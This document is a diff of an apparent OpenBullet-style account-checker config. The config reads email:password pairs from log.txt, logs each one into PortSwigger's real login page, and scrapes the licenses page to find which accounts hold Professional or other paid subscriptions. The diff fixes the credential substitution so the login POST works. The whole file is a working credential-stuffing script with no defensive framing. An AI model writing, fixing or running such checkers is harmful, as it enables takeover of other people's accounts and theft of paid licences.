@@ -1,44 +1,51 @@
 ## PortSwigger Subscription Extraction
-## Reads accounts from log.txt and extracts licenses page HTML
+## Reads accounts from log.txt and extracts subscription information
+## Version: Test first account with corrected variable substitution
 
 FileReadLines "log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-## Process account [0]
+## Extract first account credentials
 SET VAR "account" $"<accounts[0]>"
 Split $"<account>" ":" -> VAR "creds"
 SET VAR "email" $"<creds[0]>"
 SET VAR "password" $"<creds[1]>"
 
-PRINT "Account: test" White
+PRINT "Testing account: <email>" White
 
-## Step 1: GET login page
-HttpRequest GET "https://login.portswigger.net/u/login"
+## Step 1: GET login page to establish session
+HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
 SET VAR "loginPageRes" $"<SOURCE>"
+PRINT "Step 1 - Login page fetched" White
 
-PRINT "Step 1 done" White
-
-## Step 2: POST credentials - direct POST with form data
-HttpRequest POST "https://login.portswigger.net/u/login"
-  CONTENT $"<email>"
+## Step 2: POST login credentials with form data containing email and password
+HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
+  CONTENT "username=<email>&password=<password>&action=default"
   CONTENTTYPE "application/x-www-form-urlencoded"
-
 SET VAR "loginRes" $"<SOURCE>"
+PRINT "Step 2 - Credentials posted" White
 
-PRINT "Step 2 done" White
-
-## Step 3: GET licenses page
-HttpRequest GET "https://portswigger.net/users/youraccount/licenses"
-
+## Step 3: GET licenses page (cookies should be preserved from login)
+HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
 SET VAR "licensesRes" $"<SOURCE>"
+PRINT "Step 3 - Licenses page fetched" White
 
-PRINT "Step 3 done" White
-
-## Check response
-IF $"<licensesRes>" Contains "subscription"
-  PRINT "Found subscription" Green
+## Check for subscription types
+IF $"<licensesRes>" Contains "Professional"
+  PRINT "FOUND: <email> has Professional subscription" Green
 ELSE
-  PRINT "No subscription in response" Red
+  IF $"<licensesRes>" Contains "Community"
+    PRINT "FOUND: <email> has Community subscription" Green
+  ELSE
+    IF $"<licensesRes>" Contains "subscription"
+      PRINT "FOUND: <email> has some subscription" Green
+    ELSE
+      PRINT "NO: <email> has no paid subscription" Yellow
+    ENDIF
+  ENDIF
 ENDIF
 
-PRINT "Complete" White
+## Debug: show response length
+PRINT "Response length: " White
+
+PRINT "Test complete" White
